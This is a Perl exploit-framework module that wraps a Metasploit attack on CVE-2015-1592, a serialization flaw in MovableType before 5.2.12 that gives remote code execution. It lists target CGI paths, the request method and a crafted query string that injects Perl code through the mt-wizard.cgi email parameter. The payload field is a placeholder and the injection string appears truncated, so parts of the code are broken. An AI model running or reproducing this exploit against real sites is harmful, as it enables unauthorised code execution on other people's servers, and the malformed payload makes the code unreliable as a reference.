package SIXAPART::MSF::SixapartMovabletypeStorableExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SixapartMovabletypeStorableExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2015-1592",
  DESCRIPTION => "

          This module exploits a serialization flaw in MovableType before 5.2.12 to execute

          arbitrary code. The default nondestructive mode depends on the target server having

          the Object::MultiType and DateTime Perl modules installed in Perl's \@INC paths.

          The destructive mode of operation uses only required MovableType dependencies,

          but it will noticeably corrupt the MovableType installation.

      ",
  METHOD => "GET",
  MSF_MODULE => "sixapart_movabletype_storable_exec",
  PATH => "__mode=next_step&step=optional&default_language=en_us&email_address_main=x\
ObjectDrivermysql;useCGI;printqq{Content-type:text/plain\\\
\\\
&",
  PATHS => [
    "mt-wizard.cgi",
    "mt-wizard.cgi",
    "mt-wizard.cgi",
    "cgi-bin/mt/",
  ],
  PAYLOAD => "?",
  REFERENCES => [
    "https://movabletype.org/news/2015/02/movable_type_607_and_5212_released_to_close_security_vulnera.html",
  ],
  TITLE => "SixApart MovableType Storable Perl Code Execution",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "MoveableType cgi-bin directory path",
  VALUE => "/cgi-bin/mt/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
